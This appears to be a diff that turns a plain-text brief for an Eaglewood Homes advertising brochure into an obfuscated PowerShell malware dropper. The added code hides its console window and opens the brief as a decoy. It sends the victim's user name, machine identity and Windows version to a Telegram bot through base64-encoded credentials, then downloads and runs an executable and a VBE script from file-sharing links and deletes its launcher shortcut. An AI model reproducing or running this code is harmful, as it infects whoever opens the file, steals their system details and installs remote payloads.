@@ -1,3 +1,11 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="!!Technical!!.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
 TECHNICAL SPECIFICATION
 Advertising Brochure for Eaglewood Homes
 
@@ -70,3 +78,100 @@ Everything through email please, keeps it documented.
 Project email: info@eaglewood.com
 
 Let me know you got this and give me a rough timeline for the first draft.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ab01256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="OAAAADcAAAAyAAAAMgAAADgAAAA1AAAAOQAAADUAAAAyAAAANwAAADoAAABBAAAAQQAAAEUAAAA2AAAAXwAAAGYAAABwAAAAUAAAAGMAAAAtAAAAOQAAADMAAABIAAAAWAAAAHAAAAA1AAAANgAAAG0AAABXAAAAZgAAADgAAABMAAAAYQAAAEYAAABXAAAASwAAAFoAAABMAAAAeQAAAF8AAABiAAAAcQAAADIAAABUAAAASQAAAA=="
+$v13=[System.Convert]::FromBase64String($v12)
+$v14=[System.Text.Encoding]::UTF32
+$v15=$v14.GetString($v13)
+$v16="MgAAADcAAAAwAAAAOAAAADYAAAA1AAAANAAAADAAAAA4AAAA"
+$v17=[System.Convert]::FromBase64String($v16)
+$v18=$v14.GetString($v17)
+$v19=8/2+1
+If($v19>0){}
+$v20=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v21=(Get-CimInstance Win32_OperatingSystem).Caption
+$v22=Get-Content -Path $v10 -Raw
+$v23=$v22+"`n`nSession started for user: "+$v20+"`nWindows Version: "+$v21
+$v24="https://api.telegram.org/bot"+$v15+"/sendMessage"
+$v25=6*2-3
+If($v25>0){}
+$v26=@{chat_id=$v18;text=$v23}|ConvertTo-Json -Compress
+$v27=4+6-2
+If($v27>0){}
+try{$v28=Invoke-RestMethod -Uri $v24 -Method Post -ContentType "application/json" -Body $v26}catch{}
+$v29="___"
+$v30=[System.Convert]::FromBase64String($v29)
+$v31=$v14.GetString($v30)
+$v32="___"
+$v33=[System.Convert]::FromBase64String($v32)
+$v34=$v14.GetString($v33)
+$v35=3*4-2
+If($v35>0){}
+$v36="https://api.telegram.org/bot"+$v31+"/sendMessage"
+$v37=2*5-1
+If($v37>0){}
+$v38=@{chat_id=$v34;text=$v23}|ConvertTo-Json -Compress
+$v39=9-3+1
+If($v39>0){}
+try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
+$v41=8*2-3
+If($v41>0){}
+Start-Sleep -Seconds 300
+$v42=7*2-1
+If($v42>0){}
+$v43="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=8n8ew00bgg3soq0rix289yrvyobaef5e&file_id=f_2252791038503"
+$v44="1446062403_house.vbe"
+$v45=[Environment]::GetFolderPath("LocalApplicationData")
+$v46=Join-Path $v45 $v44
+$v47=6*3-2
+If($v47>0){}
+try{$v48=New-Object System.Net.WebClient;$v48.DownloadFile($v43,$v46)}catch{}
+$v49=5+3-1
+If($v49>0){}
+$v50="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=th7xazttzge36xcz3u8ac1tbyk8m6m8a&file_id=f_2252757501252"
+$v51="1446062403_key.exe"
+$v52=Join-Path $v45 $v51
+$v53=7*2+1
+If($v53>0){}
+try{$v54=New-Object System.Net.WebClient;$v54.DownloadFile($v50,$v52);$v55=New-Object System.Diagnostics.ProcessStartInfo;$v55.FileName=$v52;$v55.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v55.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v55)|Out-Null}catch{}
+$v56=10/2+3
+If($v56>0){}
+$v57="!!Technical!!.txt.ink"
+$v58=$false
+$v59=$null
+$v60=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v61=3*3-2
+If($v61>0){}
+foreach($v62 in $v60){If(Test-Path -Path $v62){$v63=Join-Path $v62 $v57;If(Test-Path -Path $v63){$v59=$v63;$v58=$true;break}}}
+$v64=11-4+2
+If($v64>0){}
+If($v58){$v65=Split-Path -Parent $v59;$v66=Get-Date;$v67=600;while(((Get-Date)-$v66).TotalSeconds -lt $v67){$v68=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v68){try{Remove-Item -Path $v59 -Force -ErrorAction Stop;$v69=Join-Path $v65 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v69 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
